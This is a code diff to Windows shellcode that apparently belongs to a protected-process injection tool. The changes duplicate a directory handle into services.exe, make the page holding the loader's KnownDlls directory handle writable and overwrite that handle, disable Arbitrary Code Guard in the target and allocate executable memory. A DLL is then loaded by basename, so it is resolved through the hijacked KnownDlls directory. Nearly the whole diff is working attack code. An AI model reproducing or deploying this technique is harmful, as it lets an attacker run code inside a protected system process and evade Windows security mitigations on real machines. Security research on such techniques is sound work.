@@ -7,6 +7,8 @@
 
 #pragma optimize("", off)
 
+#define PAGE_SIZE 0x1000
+
 PSHELLCODE_PARAMS GetParams();
 PVOID FindMyBase(PSHELLCODE_PARAMS pParams);
 struct _TEB* CurrentTeb(VOID);
@@ -38,15 +40,6 @@ BOOL APIENTRY Shellcode(
 
 	Pointers.LoadLibraryW = pParams->pLoadLibraryW;
 	Pointers.GetLastError = pParams->pGetLastError;
-	Pointers.NtSetInformationProcess = pParams->pNtSetInformationProcess;
-	Pointers.RtlAdjustPrivilege = pParams->pRtlAdjustPrivilege;
-
-    // Enable SeDebugPrivilege
-    //if (0 != pParams->pRtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &ignored))
-    //{
-    //    int x = 1;
-    //    __debugbreak();
-    //}
 
     InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
 
@@ -57,7 +50,23 @@ BOOL APIENTRY Shellcode(
 		goto terminate;
     }
 
-	// Disable ACG in target process 
+	HANDLE DuplicatedDirHandle = NULL;
+	NTSTATUS st = pParams->pNtDuplicateObject(
+		NtCurrentProcess(),             // source process = spawned PPL (where inherited handle lives)
+		pParams->DirHandle,				// the inherited directory handle value in spawned PPL
+		hTarget,                        // target process = main services.exe
+		&DuplicatedDirHandle,
+		DIRECTORY_ALL_ACCESS,
+		0,
+		DUPLICATE_SAME_ACCESS
+	);
+
+	if (!NT_SUCCESS(st)) {
+        int x = 66;
+		goto terminate;
+	}
+
+	// Disable ACG in target process
 	// ProcessMitigationPolicy = 52;
     if (!NT_SUCCESS(pParams->pNtSetInformationProcess(hTarget, (PROCESSINFOCLASS)52, &Policy, sizeof(Policy))))
     {
@@ -65,7 +74,31 @@ BOOL APIENTRY Shellcode(
 		goto terminate;
     }
 
-    SIZE_T TestSize = 0x1000;
+	// Store the new handle value (valid in target)
+	PVOID TargetAddress = (PVOID)pParams->pLdrpKnownDllDirectoryHandle;
+	PVOID PageBase = (PVOID)((ULONG_PTR)TargetAddress & ~(PAGE_SIZE - 1));
+	SIZE_T RegionSize = PAGE_SIZE;
+	ULONG oldProtect = 0;
+
+	PVOID ProtectBase = PageBase;
+	SIZE_T ProtectSize = RegionSize;
+
+	st = pParams->pNtProtectVirtualMemory(hTarget, &ProtectBase, &ProtectSize, PAGE_READWRITE, &oldProtect);
+
+	if (!NT_SUCCESS(st)) {
+        int x = 67;
+		goto terminate;
+	}
+
+    if (!NT_SUCCESS(pParams->pNtWriteVirtualMemory(hTarget, TargetAddress, &DuplicatedDirHandle, sizeof(HANDLE), &bytesWritten)))
+    {
+        int x = 68;
+		goto terminate;
+    }
+
+	pParams->pNtProtectVirtualMemory(hTarget, &ProtectBase, &ProtectSize, oldProtect, &oldProtect);
+
+    SIZE_T TestSize = 0x3000;
 	pParams->pNtAllocateVirtualMemory(hTarget, &Pointers.DllPath, 0, &TestSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     if (NULL == Pointers.DllPath)
     {
@@ -110,16 +143,24 @@ BOOL APIENTRY Shellcode(
 
 terminate:
     // Don't trigger WER
-    (void)pParams->pNtTerminateProcess(NtCurrentProcess(), 0);
+    (void)pParams->pNtTerminateProcess(NtCurrentProcess(), st);
 
     return TRUE;
 }
 
 __declspec(safebuffers) DWORD WINAPI LoadLibraryThreadFunc(LoadLibraryThread *Pointers)
 {
-	HMODULE ModuleHandle;
-
-	ModuleHandle = (HMODULE)Pointers->LoadLibraryW(Pointers->DllPath);
+	// Load with basename only
+	LPCWSTR basename = Pointers->DllPath;
+	LPCWSTR p = Pointers->DllPath;
+	while (*p) {
+		if (*p == L'\\') {
+			basename = p + 1;
+		}
+		p++;
+	}
+	if (*basename == 0) basename = Pointers->DllPath;
+	HMODULE ModuleHandle = (HMODULE)Pointers->LoadLibraryW(basename);
 
 	if (ModuleHandle == NULL)
 		return (DWORD)Pointers->GetLastError();
@@ -147,7 +188,7 @@ void* _memset(void *ptr, int c, size_t n)
     return ptr;
 }
 
-size_t _wcslen(const wchar_t* str) 
+size_t _wcslen(const wchar_t* str)
 {
     size_t i = 0;
 
@@ -200,7 +241,7 @@ PVOID FindMyBase(PSHELLCODE_PARAMS pParams)
 PSHELLCODE_PARAMS GetParams()
 {
     PUCHAR pSearch = (PUCHAR)WhereAmI();
-    
+
     for (;;pSearch++)
     {
         PSHELLCODE_PARAMS pCandidate = (PSHELLCODE_PARAMS)pSearch;
